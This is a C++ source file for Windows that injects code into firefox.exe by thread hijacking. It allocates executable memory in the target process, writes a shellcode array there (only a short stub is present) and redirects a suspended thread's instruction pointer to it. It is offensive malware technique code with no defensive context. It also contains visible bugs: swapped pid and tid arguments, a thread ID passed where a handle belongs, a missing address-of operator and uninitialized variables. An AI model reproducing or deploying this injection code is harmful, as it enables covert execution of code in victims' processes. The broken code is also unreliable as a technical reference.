#include<Windows.h>
#include<iostream>
#include<TlHelp32.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8";

DWORD findTargetProcess(const wchar_t *processName){
    HANDLE snapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,0
    );
    if(snapshot == INVALID_HANDLE_VALUE){
        return 0;
    } 
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid;
    if(Process32First(snapshot,&entry)){
        do{
            if(_wcsicmp(entry.szExeFile,processName) == 0){
                pid = entry.th32ProcessID;
                break;
            }
        }while(Process32Next(snapshot,&entry));
    }
    CloseHandle(snapshot);
    return pid;
}
DWORD findThreadProcess(DWORD pid){
    HANDLE snapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,0
    );
    if(snapshot == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);
    DWORD tid;
    if(Thread32First(snapshot,&entry)){
        do{
            if(entry.th32OwnerProcessID == pid){
                tid = entry.th32ThreadID;
                break;
            }
        }while(Thread32Next(snapshot,&entry));
    }
    CloseHandle(snapshot);
    return tid;
}
void hijackThread(DWORD tid,DWORD pid){
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,0,tid);

    if(!hProcess){
        printf("Error opening the process or thread\n");
        return 0;
    }
    LPVOID remoteShellcode = VirtualAllocEx(hProcess,NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess,remoteShellcode,shellcode,sizeof(shellcode),NULL);

    SuspendThread(tid);
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread,ctx);

    #ifdef _WIN64
        ctx.Rip = (DWORD64)remoteShellcode;
    #else
        ctx.Eip = (DWORD32)remoteShellcode;
    #endif
    SetThreadContext(hThread,&ctx);
    ResumeThread(hThread);

    printf("[+] Thread hijacked!\n");
    CloseHandle(hProcess);
    CloseHandle(hThread);
}
int main(){
    DWORD pid = findTargetProcess(L"firefox.exe");
    if(!pid){
        printf("unable to target the rocess\n");
        return -1;
    }
    printf("Target process found with pid:%d\n",pid);
    DWORD tid = findThreadProcess(pid);
    if(!tid){
        printf("No target threads found in the process %d\n",pid);
        return -1;
    }
    printf("Target thread is %d\n",tid);
    hijackThread(pid,tid);
    return 0;
}
